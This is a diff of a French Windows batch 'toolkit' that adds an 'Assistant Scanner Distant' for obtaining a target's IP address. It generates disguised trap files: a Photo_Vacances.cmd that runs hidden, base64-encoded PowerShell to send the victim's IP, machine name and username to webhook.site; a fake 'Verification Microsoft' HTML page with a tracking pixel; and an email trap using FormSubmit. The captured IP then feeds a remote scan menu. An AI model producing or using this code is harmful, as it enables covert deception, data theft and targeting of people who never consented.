@@ -155,12 +155,12 @@ set "t[64]=net_reset_winsock:Reset Sockets Windows~netsh winsock reset:HIDDEN"
 set "t[65]=net_reset_all:Reset Reseau Automatique~Flush DNS, Winsock, TCP/IP:HIDDEN"
 set "t[66]=net_restart_adapters:Redemarrer les cartes reseau~Ethernet et Wi-Fi:HIDDEN"
 set "t[67]=net_fast_reset:Script d'Urgence Reseau~7 commandes de depannage:HIDDEN"
-set "t[68]=cyber_triage:TRIAGE Reseau~Diagnostic rapide de connexion:HIDDEN"
-set "t[69]=cyber_adapter_audit:ADAPTATEURS Reseau~Infos MAC et vitesse:HIDDEN"
-set "t[70]=cyber_lan_scan:LAN SCAN~Scan turbo (Marques/Ports/BruteForce):HIDDEN"
-set "t[71]=cyber_flux_analysis:FLUX Reseau~Analyse des ports et processus locaux:HIDDEN"
-set "t[72]=cyber_dns_leak:DNS LEAK~Verifier la fuite DNS (VPN):HIDDEN"
-set "t[73]=cyber_ip_grabber:IP GRABBER~Obtenir l'IP d'une box distante:HIDDEN"
+set "t[68]=cyber_triage:Triage de Connectivite~Diagnostic rapide IP, Gateway et DNS:HIDDEN"
+set "t[69]=cyber_adapter_audit:Audit des Adaptateurs Reseau~Infos MAC, vitesse et statut:HIDDEN"
+set "t[70]=cyber_lan_scan:Scanner LAN~Redirige vers l'Assistant Scanner Distant:HIDDEN"
+set "t[71]=cyber_flux_analysis:Analyse des Flux Reseau~Ports ouverts et processus actifs:HIDDEN"
+set "t[72]=cyber_dns_leak:Test de Fuite DNS~Verifier l'anonymat DNS avec VPN:HIDDEN"
+set "t[73]=cyber_ip_grabber:Assistant Scanner Distant~Trouver l'IP et analyser la cible:HIDDEN"
 set "t[74]=---:DISQUE"
 set "t[75]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
 set "t[76]=---:APPLICATIONS"
@@ -213,7 +213,7 @@ set "t[124]=touch_screen_manager:Gestionnaire Ecran Tactile~Activer/Desactiver"
 set "t[125]=sys_print_manager:Gestionnaire d'Imprimantes~Lister/Vider le Spooler"
 set "t[126]=cl_all:Tout Nettoyer d'un coup~Nettoyage automatique complet:HIDDEN"
 set "t[127]=cyber_exposure_audit:Audit d'Exposition des Donnees~Recherche fichiers sensibles:HIDDEN"
-set "t[131]=cyber_wifi_audit:Analyseur de Securite Wi-Fi~Detection Evil Twin:HIDDEN"
+set "t[131]=cyber_wifi_audit:Analyseur Wi-Fi (Evil Twin)~Detection de faux points d'acces:HIDDEN"
 set "t[132]=hw_smart:Test SMART des Disques~Sante et duree de vie:HIDDEN"
 set "t[133]=hw_winsat:Score WinSAT~Indice de performance Windows:HIDDEN"
 set "t[134]=hw_ram_test:Test RAM (Windows)~Outil de diagnostic memoire:HIDDEN"
@@ -336,6 +336,14 @@ set "map_um_del=Supprimer un utilisateur~Effacer compte et donnees"
 set "map_um_admin=Gerer les droits~Passer standard ou administrateur"
 set "map_um_reset=Ajouter/Modifier MDP~Changer mot de passe utilisateur"
 set "map_um_remove_pwd=Supprimer le MDP (Auto-login)~Enlever le mot de passe"
+set "map_cyber_triage=Triage de Connectivite~Diagnostic rapide IP, Gateway et DNS"
+set "map_cyber_adapter_audit=Audit des Adaptateurs Reseau~Infos MAC, vitesse et statut"
+set "map_cyber_lan_scan=Scanner de Failles Reseau~LAN, vulnerabilites et connexion distante"
+set "map_cyber_flux_analysis=Analyse des Flux Reseau~Ports ouverts et processus actifs"
+set "map_cyber_dns_leak=Test de Fuite DNS~Verifier l'anonymat DNS avec VPN"
+set "map_cyber_ip_grabber=Assistant Scanner Distant~Trouver l'IP et analyser la cible"
+set "map_cyber_wifi_audit=Analyseur Wi-Fi (Evil Twin)~Detection de faux points d'acces"
+set "map_cyber_exposure_audit=Audit d'Exposition des Donnees~Recherche de fichiers sensibles"
 
 if not exist "%SCRIPT_DIR%\favoris.txt" type nul > "%SCRIPT_DIR%\favoris.txt"
 
@@ -1590,96 +1598,183 @@ REM ===================================================================
 REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 :net_cyber_menu
-call :AutoMenu "CYBERSECURITE RESEAU" "cyber_triage;cyber_adapter_audit;cyber_lan_scan;cyber_flux_analysis;cyber_dns_leak;cyber_wifi_audit;cyber_ip_grabber" "NONUMS"
+call :AutoMenu "CYBERSECURITE RESEAU" "cyber_triage;cyber_adapter_audit;cyber_flux_analysis;cyber_dns_leak;cyber_wifi_audit;cyber_ip_grabber"
 if "%errorlevel%"=="0" goto system_tools
 goto !AutoMenu_Target!
 
+REM ===================================================================
 :cyber_ip_grabber
+REM   ASSISTANT SCANNER DISTANT - IP Grabber + Scanner fusionnes
+set "opts=J'ai deja l'IP ou le DNS de la cible;Je n'ai pas l'IP - Utiliser un piege;Scanner mon reseau local (LAN automatique)"
+call :DynamicMenu "AVEZ-VOUS L'IP DE LA CIBLE ?" "%opts%" "NONUMS"
+set "ds_ch=%errorlevel%"
+if "%ds_ch%"=="0" goto net_cyber_menu
+if "%ds_ch%"=="1" goto ds_saisir_ip
+if "%ds_ch%"=="3" goto cyber_lan_direct
+goto cyber_grabber_methods
+
+:ds_saisir_ip
 cls
 echo.
-echo  ================================================
-echo   IP GRABBER FURTIF (MULTI-METHODES)
-echo  ================================================
+echo  ================================================
+echo   SAISIR L'IP OU LE NOM DNS DE LA CIBLE
+echo  ================================================
 echo.
-set "opts=Trame en direct (Ecoute dans cette console);Reception par E-Mail (Asynchrone)"
-call :DynamicMenu "CHOIX DE L'EXFILTRATION" "%opts%" "NONUMS NOCLS"
-set "ig_ch=%errorlevel%"
-if "%ig_ch%"=="0" goto net_cyber_menu
-if "%ig_ch%"=="2" goto ig_email
+echo  Exemples :
+echo   - IP publique WAN  : 82.xx.xx.xx
+echo   - DDNS             : cousin.duckdns.org
+echo   - Tailscale        : nom-pc.tailXXXX.ts.net
+echo.
+call :InputWithEsc "IP ou DNS de la cible : " remote_ip
+if errorlevel 1 goto cyber_ip_grabber
+if not defined remote_ip goto cyber_ip_grabber
+set "remote_pc="
+echo.
+call :InputWithEsc "Port specifique ? (vide = defaut) : " remote_port
+if errorlevel 1 goto cyber_ip_grabber
+if not defined remote_port set "remote_port=NONE"
+goto cyber_remote_menu
 
-:ig_local
+:cyber_lan_direct
+set "base_ip=AUTO"
+goto start_lan_scan
+
+:cyber_grabber_methods
+set "opts=[DNS] Resoudre le nom/DDNS du PC distant (DuckDNS, Tailscale...)~Votre cousin a configure un DDNS ou vous connaissez son hostname;[PIEGE CMD] Fichier piege .cmd - votre cousin clique, son IP est capturee~Le fichier Photo_Vacances.cmd envoie son IP via webhook.site;[PIXEL HTML] Page HTML piege - votre cousin ouvre un lien, IP capturee~Lien a envoyer par Discord/email, aucun clic suspect;[PIEGE EMAIL] Email de confirmation - son IP vous est transmise~Utilise FormSubmit, votre cousin remplit un formulaire;[MANUEL] Votre cousin vous communique son IP (via ipconfig)~Simple, demandez-lui de taper ipconfig dans cmd"
+call :DynamicMenu "METHODES D'OBTENTION DE L'IP DISTANTE" "%opts%" "NONUMS"
+set "gm_ch=%errorlevel%"
+if "%gm_ch%"=="0" goto cyber_ip_grabber
+if "%gm_ch%"=="1" goto gm_dns_resolve
+if "%gm_ch%"=="2" goto gm_webhook_trap
+if "%gm_ch%"=="3" goto gm_pixel_html
+if "%gm_ch%"=="4" goto gm_email_trap
+if "%gm_ch%"=="5" goto gm_manual_ip
+goto cyber_grabber_methods
+
+REM --- [1] DNS Resolution ---
+:gm_dns_resolve
 cls
 echo.
-echo  ================================================
-echo   IP GRABBER - ECOUTE LOCALE TEMPS REEL
-echo  ================================================
+echo  ================================================
+echo   [DNS] RESOLUTION PAR NOM / DDNS
+echo  ================================================
 echo.
-echo  [i] Connexion au relai et generation du piege en cours...
+echo  Utilisez cette methode si vous connaissez :
+echo   - Nom NetBIOS du PC   ex: DESKTOP-ABCDEF
+echo   - DDNS                ex: cousin.duckdns.org
+echo   - Tailscale           ex: pc-cousin.tailXXXX.ts.net
+echo.
+call :InputWithEsc "Nom du PC ou DDNS : " ds_hostname
+if errorlevel 1 goto cyber_grabber_methods
+if not defined ds_hostname goto cyber_grabber_methods
+echo.
+echo  [>] Resolution de !ds_hostname! en cours...
+set "DS_PS=%TEMP%\dns_res_%RANDOM%.ps1"
+>> "%DS_PS%" echo $h = '!ds_hostname!'
+>> "%DS_PS%" echo try {
+>> "%DS_PS%" echo   $a = [System.Net.Dns]::GetHostAddresses($h) ^| Where-Object { $_.AddressFamily -eq 'InterNetwork' }
+>> "%DS_PS%" echo   if ($a) {
+>> "%DS_PS%" echo     $ip = ($a ^| Select-Object -First 1).IPAddressToString
+>> "%DS_PS%" echo     Write-Host "  [OK] IP resolue : $ip" -f Green
+>> "%DS_PS%" echo     $ip ^| Set-Content "$env:TEMP\resolved_ip.txt" -Encoding ASCII
+>> "%DS_PS%" echo   } else { Write-Host '  [!] Aucune IPv4 trouvee' -f Yellow }
+>> "%DS_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%DS_PS%"
+del /f /q "%DS_PS%" 2>nul
+if exist "%TEMP%\resolved_ip.txt" (
+    set /p remote_ip=<"%TEMP%\resolved_ip.txt"
+    del /f /q "%TEMP%\resolved_ip.txt"
+    if defined remote_ip (
+        set "remote_pc=!ds_hostname!"
+        set "remote_port=NONE"
+        echo.
+        echo  [-^>] IP : !remote_ip! --- Lancement du scan dans 2s...
+        timeout /t 2 >nul
+        goto cyber_remote_menu
+    )
+)
+echo.
+echo  [!] Echec. Essayez une autre methode.
+pause >nul
+goto cyber_grabber_methods
 
-set "PS_GRAB_FILE=%TEMP%\ig_listen.ps1"
-if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
-
->  "%PS_GRAB_FILE%" echo $Host.UI.RawUI.FlushInputBuffer()
->> "%PS_GRAB_FILE%" echo try {
->> "%PS_GRAB_FILE%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
->> "%PS_GRAB_FILE%" echo $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
->> "%PS_GRAB_FILE%" echo $id = $tk.uuid
->> "%PS_GRAB_FILE%" echo if (-not $id) { throw 'UUID vide' }
->> "%PS_GRAB_FILE%" echo $url = 'https://webhook.site/' + $id
->> "%PS_GRAB_FILE%" echo $api = 'https://webhook.site/token/' + $id + '/requests'
->> "%PS_GRAB_FILE%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
->> "%PS_GRAB_FILE%" echo     $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + `$env:COMPUTERNAME + '/' + `$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
->> "%PS_GRAB_FILE%" echo     $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
->> "%PS_GRAB_FILE%" echo     $cmd = "@echo off`r`nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`r`nexit"
->> "%PS_GRAB_FILE%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
->> "%PS_GRAB_FILE%" echo Write-Host ''
->> "%PS_GRAB_FILE%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd' -f Green
->> "%PS_GRAB_FILE%" echo Write-Host '  [i] En attente de la cible... (ECHAP pour annuler)' -f DarkYellow
->> "%PS_GRAB_FILE%" echo Write-Host ''
->> "%PS_GRAB_FILE%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
->> "%PS_GRAB_FILE%" echo while (-not $esc -and -not $found) {
->> "%PS_GRAB_FILE%" echo   if ($Host.UI.RawUI.KeyAvailable) {
->> "%PS_GRAB_FILE%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
->> "%PS_GRAB_FILE%" echo   }
->> "%PS_GRAB_FILE%" echo   try {
->> "%PS_GRAB_FILE%" echo     $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
->> "%PS_GRAB_FILE%" echo     if (@($rs.data).Count -gt 0) {
->> "%PS_GRAB_FILE%" echo       $found = $true
->> "%PS_GRAB_FILE%" echo       $d = @($rs.data)[0]
->> "%PS_GRAB_FILE%" echo       $ip_val = $d.ip
->> "%PS_GRAB_FILE%" echo       $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
->> "%PS_GRAB_FILE%" echo       $pc_val  = if ($segs.Count -ge 2) { $segs[-2] } else { '?' }
->> "%PS_GRAB_FILE%" echo       $usr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
->> "%PS_GRAB_FILE%" echo       Write-Host ''
->> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
->> "%PS_GRAB_FILE%" echo       Write-Host ('   IP      : ' + $ip_val)  -f Cyan
->> "%PS_GRAB_FILE%" echo       Write-Host ('   Machine : ' + $pc_val)  -f White
->> "%PS_GRAB_FILE%" echo       Write-Host ('   Session : ' + $usr_val) -f White
->> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
->> "%PS_GRAB_FILE%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII
->> "%PS_GRAB_FILE%" echo     }
->> "%PS_GRAB_FILE%" echo   } catch {}
->> "%PS_GRAB_FILE%" echo   if (-not $found) {
->> "%PS_GRAB_FILE%" echo     $i = 3
->> "%PS_GRAB_FILE%" echo     while ($i -gt 0) {
->> "%PS_GRAB_FILE%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
->> "%PS_GRAB_FILE%" echo       $si++; $i--
->> "%PS_GRAB_FILE%" echo       Start-Sleep -Milliseconds 1000
->> "%PS_GRAB_FILE%" echo       if ($Host.UI.RawUI.KeyAvailable) {
->> "%PS_GRAB_FILE%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
->> "%PS_GRAB_FILE%" echo       }
->> "%PS_GRAB_FILE%" echo     }
->> "%PS_GRAB_FILE%" echo   }
->> "%PS_GRAB_FILE%" echo }
->> "%PS_GRAB_FILE%" echo if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
->> "%PS_GRAB_FILE%" echo if ($found) { Write-Host '  [OK] Transfert termine.' -f Green }
->> "%PS_GRAB_FILE%" echo } catch {
->> "%PS_GRAB_FILE%" echo     Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red
->> "%PS_GRAB_FILE%" echo }
-
-powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB_FILE%"
-if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
-
+REM --- [2] Piege CMD Webhook ---
+:gm_webhook_trap
+cls
+echo.
+echo  ================================================
+echo   [PIEGE CMD] LIEN WEBHOOK.SITE
+echo  ================================================
+echo.
+echo  [i] Un fichier Photo_Vacances.cmd sera cree sur votre Bureau.
+echo      Envoyez-le a votre cousin (Discord, email, cle USB...).
+echo      Quand il double-clique, son IP arrive ici et le scan
+echo      se lance automatiquement.
+echo.
+echo  [i] Connexion au relai webhook.site en cours...
+set "PS_WH=%TEMP%\ig_wh_%RANDOM%.ps1"
+>> "%PS_WH%" echo $Host.UI.RawUI.FlushInputBuffer()
+>> "%PS_WH%" echo try {
+>> "%PS_WH%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+>> "%PS_WH%" echo $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
+>> "%PS_WH%" echo $id = $tk.uuid
+>> "%PS_WH%" echo if (-not $id) { throw 'UUID vide' }
+>> "%PS_WH%" echo $url = 'https://webhook.site/' + $id
+>> "%PS_WH%" echo $api = 'https://webhook.site/token/' + $id + '/requests'
+>> "%PS_WH%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
+>> "%PS_WH%" echo $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + `$env:COMPUTERNAME + '/' + `$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
+>> "%PS_WH%" echo $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
+>> "%PS_WH%" echo $cmd = "@echo off`
+`
+start /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`
+`
+exit"
+>> "%PS_WH%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
+>> "%PS_WH%" echo Write-Host ''
+>> "%PS_WH%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd sur le Bureau' -f Green
+>> "%PS_WH%" echo Write-Host '  [i] Envoyez ce fichier a votre cousin et attendez...' -f Cyan
+>> "%PS_WH%" echo Write-Host '  [i] En attente (ECHAP pour annuler)' -f DarkYellow
+>> "%PS_WH%" echo Write-Host ''
+>> "%PS_WH%" echo $sp = @('|','/','-','\'); $si = 0; $esc = $false; $found = $false
+>> "%PS_WH%" echo while (-not $esc -and -not $found) {
+>> "%PS_WH%" echo   if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_WH%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_WH%" echo   }
+>> "%PS_WH%" echo   try {
+>> "%PS_WH%" echo     $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
+>> "%PS_WH%" echo     if (@($rs.data).Count -gt 0) {
+>> "%PS_WH%" echo       $found = $true
+>> "%PS_WH%" echo       $d = @($rs.data)[0]
+>> "%PS_WH%" echo       $ip_val = $d.ip
+>> "%PS_WH%" echo       $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
+>> "%PS_WH%" echo       $pc_val  = if ($segs.Count -ge 2) { $segs[-2] } else { '?' }
+>> "%PS_WH%" echo       $usr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
+>> "%PS_WH%" echo       Write-Host ''
+>> "%PS_WH%" echo       Write-Host '  =================================================' -f Red
+>> "%PS_WH%" echo       Write-Host ("  IP      : " + $ip_val) -f Cyan
+>> "%PS_WH%" echo       Write-Host ("  Machine : " + $pc_val) -f White
+>> "%PS_WH%" echo       Write-Host ("  Session : " + $usr_val) -f White
+>> "%PS_WH%" echo       Write-Host '  =================================================' -f Red
+>> "%PS_WH%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII
+>> "%PS_WH%" echo     }
+>> "%PS_WH%" echo   } catch {}
+>> "%PS_WH%" echo   if (-not $found) {
+>> "%PS_WH%" echo     $i = 3
+>> "%PS_WH%" echo     while ($i -gt 0) {
+>> "%PS_WH%" echo       [Console]::Write("`
+  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
+>> "%PS_WH%" echo       $si++; $i--; Start-Sleep -Milliseconds 1000
+>> "%PS_WH%" echo       if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_WH%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_WH%" echo       }
+>> "%PS_WH%" echo     }
+>> "%PS_WH%" echo   }
+>> "%PS_WH%" echo }
+>> "%PS_WH%" echo if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
+>> "%PS_WH%" echo if ($found) { Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green }
+>> "%PS_WH%" echo } catch { Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_WH%"
+if exist "%PS_WH%" del /f /q "%PS_WH%"
 if exist "%TEMP%\captured_ip.txt" (
     set /p capture_data=<"%TEMP%\captured_ip.txt"
     for /f "tokens=1-3 delims=;" %%a in ("!capture_data!") do (
@@ -1688,64 +1783,163 @@ if exist "%TEMP%\captured_ip.txt" (
         set "remote_user=%%c"
     )
     del /f /q "%TEMP%\captured_ip.txt"
-
-    if not exist "ip distant.txt" type nul > "ip distant.txt"
-    findstr /C:"IP: !remote_ip!" "ip distant.txt" >nul
-    if errorlevel 1 (
-        echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !remote_user! >> "ip distant.txt"
+    if defined remote_ip (
+        if not exist "ip distant.txt" type nul > "ip distant.txt"
+        findstr /C:"IP: !remote_ip!" "ip distant.txt" >nul
+        if errorlevel 1 echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !remote_user! >> "ip distant.txt"
+        set "remote_port=NONE"
+        goto cyber_remote_menu
     )
-
-    echo.
-    echo  [!] CIBLE DETECTEE : !remote_ip! (!remote_pc!\!remote_user!)
-    echo  [i] Informations enregistrees dans 'ip distant.txt'
-    echo  [i] Passage immédiat à l'Audit de penetration...
-    
-    set "remote_port=NONE"
-    goto cyber_remote_menu
 )
+goto cyber_grabber_methods
 
-goto net_cyber_menu
-
-:ig_email
+REM --- [3] Pixel HTML Tracker ---
+:gm_pixel_html
 cls
 echo.
-echo  ================================================
-echo   IP GRABBER - TRANSFERT PAR E-MAIL
-echo  ================================================
+echo  ================================================
+echo   [HTML] PIXEL TRACKER NAVIGATEUR
+echo  ================================================
 echo.
-echo  [i] Cette methode ferme la fenetre CMD chez la cible et vous envoie
-echo      les informations directement sur votre messagerie via l'API FormSubmit.
+echo  [i] Genere une page HTML a envoyer a votre cousin.
+echo      Il lui suffit de l'ouvrir dans Chrome ou Firefox.
+echo      Aucun double-clic ni execution requise.
+echo      Son IP est captee des l'ouverture de la page.
 echo.
-echo  [!] ATTENTION : Lors du TOUT PREMIER essai, vous recevrez un email
-echo      de FormSubmit vous demandant de "Confirmer/Activer" l'adresse.
-echo      Cliquez sur le lien, puis les fois suivantes seront automatiques.
-echo.
-call :InputWithEsc "Votre adresse e-mail de reception : " grab_email
-if errorlevel 1 goto cyber_ip_grabber
-if "!grab_email!"=="" goto cyber_ip_grabber
+echo  [i] Generation du token webhook.site...
+set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
+>> "%PS_HTML%" echo $Host.UI.RawUI.FlushInputBuffer()
+>> "%PS_HTML%" echo try {
+>> "%PS_HTML%" echo   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+>> "%PS_HTML%" echo   $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
+>> "%PS_HTML%" echo   $id = $tk.uuid; if (-not $id) { throw 'UUID vide' }
+>> "%PS_HTML%" echo   $url = 'https://webhook.site/' + $id
+>> "%PS_HTML%" echo   $api = 'https://webhook.site/token/' + $id + '/requests'
+>> "%PS_HTML%" echo   $desk = [Environment]::GetFolderPath('Desktop') + '\Verification_Microsoft.html'
+>> "%PS_HTML%" echo   $html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Verification Microsoft</title><style>body{font-family:Segoe UI,sans-serif;text-align:center;padding:80px;background:#f3f3f3}h2{color:#0078d4}.ld{border:4px solid #ddd;border-top:4px solid #0078d4;border-radius:50%;width:36px;height:36px;animation:sp 1s linear infinite;margin:20px auto}@keyframes sp{to{transform:rotate(360deg)}}</style></head><body><img src='$url' width='1' height='1' style='display:none'><div class='ld'></div><h2>Verification de securite</h2><p>Une analyse est en cours sur votre appareil.<br>Veuillez patienter sans fermer cette fenetre.</p><script>try{fetch('$url/'+navigator.platform+'/'+screen.width+'x'+screen.height);}catch(e){}</script></body></html>"
+>> "%PS_HTML%" echo   Set-Content -Path $desk -Value $html -Encoding UTF8
+>> "%PS_HTML%" echo   Write-Host '  [OK] Page HTML generee : Verification_Microsoft.html' -f Green
+>> "%PS_HTML%" echo   Write-Host '  [i] Envoyez ce fichier a votre cousin (Discord, email...)' -f Cyan
+>> "%PS_HTML%" echo   Write-Host '  [i] Il suffit qu''il l''ouvre dans son navigateur' -f Cyan
+>> "%PS_HTML%" echo   Write-Host '  [i] En attente... (ECHAP pour annuler)' -f DarkYellow
+>> "%PS_HTML%" echo   Write-Host ''
+>> "%PS_HTML%" echo   $sp = @('|','/','-','\'); $si = 0; $esc = $false; $found = $false
+>> "%PS_HTML%" echo   while (-not $esc -and -not $found) {
+>> "%PS_HTML%" echo     if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_HTML%" echo       if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_HTML%" echo     }
+>> "%PS_HTML%" echo     try {
+>> "%PS_HTML%" echo       $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
+>> "%PS_HTML%" echo       if (@($rs.data).Count -gt 0) {
+>> "%PS_HTML%" echo         $found = $true; $d = @($rs.data)[0]; $ip_val = $d.ip
+>> "%PS_HTML%" echo         $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
+>> "%PS_HTML%" echo         Write-Host ''
+>> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
+>> "%PS_HTML%" echo         Write-Host ("  IP         : " + $ip_val) -f Cyan
+>> "%PS_HTML%" echo         Write-Host ("  Plateforme : " + (if ($segs.Count -ge 2) { $segs[-2] } else { '?' })) -f White
+>> "%PS_HTML%" echo         Write-Host ("  Ecran      : " + (if ($segs.Count -ge 1) { $segs[-1] } else { '?' })) -f White
+>> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
+>> "%PS_HTML%" echo         Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val;HTML;pixel" -Encoding ASCII
+>> "%PS_HTML%" echo       }
+>> "%PS_HTML%" echo     } catch {}
+>> "%PS_HTML%" echo     if (-not $found) {
+>> "%PS_HTML%" echo       $i = 3
+>> "%PS_HTML%" echo       while ($i -gt 0) {
+>> "%PS_HTML%" echo         [Console]::Write("`
+  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
+>> "%PS_HTML%" echo         $si++; $i--; Start-Sleep -Milliseconds 1000
+>> "%PS_HTML%" echo         if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_HTML%" echo           if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_HTML%" echo         }
+>> "%PS_HTML%" echo       }
+>> "%PS_HTML%" echo     }
+>> "%PS_HTML%" echo   }
+>> "%PS_HTML%" echo   if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
+>> "%PS_HTML%" echo   if ($found) { Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green }
+>> "%PS_HTML%" echo } catch { Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_HTML%"
+if exist "%PS_HTML%" del /f /q "%PS_HTML%"
+if exist "%TEMP%\captured_ip.txt" (
+    set /p capture_data=<"%TEMP%\captured_ip.txt"
+    for /f "tokens=1 delims=;" %%a in ("!capture_data!") do set "remote_ip=%%a"
+    del /f /q "%TEMP%\captured_ip.txt"
+    if defined remote_ip (
+        set "remote_pc=HTML-Tracker"
+        set "remote_port=NONE"
+        goto cyber_remote_menu
+    )
+)
+goto cyber_grabber_methods
 
-set "PS_GRAB=%TEMP%\ip_grab.ps1"
-if exist "%PS_GRAB%" del /f /q "%PS_GRAB%"
-
->  "%PS_GRAB%" echo $cmdPath = "$env:USERPROFILE\Desktop\Photo_Vacances.cmd"
+REM --- [4] Email Trap ---
+:gm_email_trap
+cls
+echo.
+echo  ================================================
+echo   [EMAIL] PIEGE PAR E-MAIL
+echo  ================================================
+echo.
+echo  [i] Genere un fichier Photo_Vacances.cmd sur le Bureau.
+echo      Quand votre cousin l'execute, vous recevez un email
+echo      avec son IP, nom de machine et session.
+echo.
+echo  [!] 1er envoi : confirmez d'abord l'adresse dans le
+echo      mail de validation de FormSubmit.
+echo.
+call :InputWithEsc "Votre e-mail de reception : " grab_email
+if errorlevel 1 goto cyber_grabber_methods
+if not defined grab_email goto cyber_grabber_methods
+set "PS_EM=%TEMP%\ig_em_%RANDOM%.ps1"
 set "gemail=!grab_email!"
->> "%PS_GRAB%" echo $u = 'https://formsubmit.co/%gemail%'
->> "%PS_GRAB%" echo $psPayload = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{IP=`$ip; Machine=`$env:COMPUTERNAME; Session=`$env:USERNAME; _subject='Nouvelle Cible Identifiee'; _captcha='false'}; Invoke-RestMethod -Uri `$u -Method Post -Body `$b -UseBasicParsing } catch {}"
->> "%PS_GRAB%" echo $psPayloadBytes = [System.Text.Encoding]::Unicode.GetBytes($psPayload)
->> "%PS_GRAB%" echo $psB64 = [Convert]::ToBase64String($psPayloadBytes)
->> "%PS_GRAB%" echo $obf = "@echo off`r`nstart /B powershell -w 1 -nop -ep bypass -EncodedCommand $psB64`r`nexit"
->> "%PS_GRAB%" echo Set-Content -Path $cmdPath -Value $obf -Encoding ASCII
->> "%PS_GRAB%" echo Write-Host ''
->> "%PS_GRAB%" echo Write-Host '  [OK] Piege genere sur le Bureau : Photo_Vacances.cmd' -f Green
->> "%PS_GRAB%" echo Write-Host "  [i] Le payload l'expediera vers : !grab_email!" -f DarkGray
->> "%PS_GRAB%" echo Write-Host ''
